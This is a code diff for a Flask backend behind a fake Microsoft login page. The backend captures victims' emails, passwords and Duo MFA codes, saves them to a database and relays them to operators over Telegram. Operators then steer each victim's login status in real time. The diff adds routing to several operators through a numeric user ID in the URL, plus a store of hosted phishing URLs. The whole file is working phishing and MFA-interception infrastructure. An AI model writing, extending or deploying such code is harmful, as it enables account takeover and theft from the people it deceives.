@@ -1,113 +1,147 @@
-from flask import Flask, request
-from flask import render_template, send_from_directory,  redirect, Response
-
-from models import Email_statuses
+from flask import Flask, request, session, jsonify # <-- Make sure jsonify is imported
+from flask import render_template, send_from_directory, redirect, Response
+from models import Email_statuses, HostedUrls # <-- Import HostedUrls
 from flask_cors import CORS
-
 from dotenv import load_dotenv
 from tg import send_notification, get_status_update
-
-load_dotenv()
 import os
+from urllib.parse import quote
 
-hosted_url = os.getenv("HOSTED_URL")
+# --- Load Environment Variables ---
+load_dotenv()
+HOSTED_URL = os.getenv("HOSTED_URL")
+DEFAULT_USER_ID = os.getenv("USER_ID")
 
-
+# --- Flask App Initialization ---
 app = Flask(__name__, static_folder='microsoft_login/build')
-
+app.secret_key = os.getenv("SECRET_KEY", "a-secure-random-string-for-production")
 CORS(app)
+
+
+# --- Application Startup Logic ---
+def initialize_database():
+    """
+    Ensures required data, like the hosted URL, is present in the database on startup.
+    """
+    if HOSTED_URL:
+        # This command will insert the document if it doesn't exist,
+        # and do nothing if a document with that URL already exists.
+        HostedUrls.update_one(
+            {'url': HOSTED_URL},
+            {'$setOnInsert': {'url': HOSTED_URL}},
+            upsert=True
+        )
+        print(f"[*] Verified that HOSTED_URL '{HOSTED_URL}' is in the database.")
+
+# Run the initialization logic when the app starts
+initialize_database()
+
+
+# --- API Endpoints ---
+
+@app.get("/urls")
+def get_urls():
+    """
+    Returns a JSON list of all unique HOSTED_URLs saved in the database.
+    """
+    try:
+        # Find all entries, but only return the 'url' field and exclude the default '_id'.
+        urls_cursor = HostedUrls.find({}, {'_id': 0, 'url': 1})
+        urls_list = [doc['url'] for doc in urls_cursor]
+        return jsonify({"urls": urls_list})
+    except Exception as e:
+        print(f"[ERROR] Could not fetch URLs from database: {e}")
+        return jsonify({"error": "Failed to connect to the database."}), 500
+
 
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
 def serve(path):
-    if path in ["vcards", "editor"]:
-        if not verify_shopify_request_path(request):
-            return {"status":"error", "message":"unauthorized"}, 401
+    """
+    Main entrypoint: handles user session setup and serves the React application.
+    """
+    path_parts = path.split('/')
+    first_part = path_parts[0]
 
-    if path != "" and os.path.exists(app.static_folder + '/' + path):
-        return send_from_directory(app.static_folder, path)
-    else:
+    if first_part.isdigit():
+        session['user_id'] = first_part
         return send_from_directory(app.static_folder, 'index.html')
 
+    if not path:
+        session['user_id'] = DEFAULT_USER_ID
+        return send_from_directory(app.static_folder, 'index.html')
 
-@app.get("/set_status/<email>/<status>")
-def set_status(email, status):
+    if os.path.exists(os.path.join(app.static_folder, path)):
+        return send_from_directory(app.static_folder, path)
+    
+    session.setdefault('user_id', DEFAULT_USER_ID)
+    return send_from_directory(app.static_folder, 'index.html')
+
+
+@app.get("/set_status/<user_id>/<email>/<status>")
+def set_status(user_id, email, status):
+    """
+    Called by Telegram buttons to update a user's login status.
+    """
     try:
         Email_statuses.update_one(
             {"email": email.strip()},
             {"$set": {"status": status}},
             upsert=True
-        )  
+        )
         return {"status":"success", "message":f"Status updated for {email} as {status}"}
     except Exception as e:
         return {"status":"error", "message":str(e)}
 
 
-
 @app.post("/auth")
 def auth():
-    # 1. Get incoming data from the frontend request
+    """
+    Handles authentication attempts from the frontend.
+    """
+    user_id_to_notify = session.get('user_id', DEFAULT_USER_ID)
     req = request.json
     email = req['email'].strip()
     password = req['password']
-    # Safely get the duoCode, which might be an empty string or None
     incoming_duo_code = req.get('duoCode')
 
-    # 2. Fetch the current user record from the database
     db_record = Email_statuses.find_one({"email": email})
 
-    # --- Logic Block 1: Handle new users or changed passwords ---
-    # If there's no record or the password differs, it's a new login attempt.
     if not db_record or db_record.get('password') != password:
-        # Notify operator of the new email/password combination
-        get_status_update(email, password)
-        
-        # Save the new credentials and reset the state
+        get_status_update(email, password, user_id=user_id_to_notify)
         Email_statuses.update_one(
             {"email": email},
             {"$set": {
                 "password": password,
                 "status": "pending",
-                "duoCode": None  # Clear any old Duo code from a previous attempt
+                "duoCode": None,
+                "user_id": user_id_to_notify
             }},
             upsert=True
         )
         return {"status": "pending"}
 
-    # --- Logic Block 2: Handle Duo Code Submission ---
-    # This block runs only if the password matches.
-    # We check if a new, non-empty Duo code has been provided.
     stored_duo_code = db_record.get('duoCode')
     if incoming_duo_code and incoming_duo_code != stored_duo_code:
-        # A new Duo code has been submitted. Notify the operator.
-        send_notification(f"Duo Code received for {email}: {incoming_duo_code}")
-
-        # Save the new code to the DB and keep the user polling
+        send_notification(f"Duo Code received for {email}: {incoming_duo_code}", user_id=user_id_to_notify)
         Email_statuses.update_one(
             {"email": email},
-            {"$set": {
-                "status": "pending",  # Keep the user on a waiting screen
-                "duoCode": incoming_duo_code
-            }}
+            {"$set": {"status": "pending", "duoCode": incoming_duo_code}}
         )
         return {"status": "pending"}
 
-    # --- Logic Block 3: Handle Standard Polling ---
-    # If the password matches and no new Duo code was submitted,
-    # this is a standard poll. Do not send any notification.
-    # Simply return the current status from the database.
-    return {"status": db_record['status']}
-
+    return {"status": db_record.get('status', 'pending')}
 
 
 @app.post("/alert")
 def alert():
+    """Sends a simple alert, respecting the user_id from the session."""
+    user_id_to_notify = session.get('user_id', DEFAULT_USER_ID)
     req = request.json
     message = req['message']
-    send_notification(message)
-    return {"status":"success", "message":"A new job came in"}
-
+    send_notification(message, user_id=user_id_to_notify)
+    return {"status":"success", "message":"Alert sent."}
 
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run()
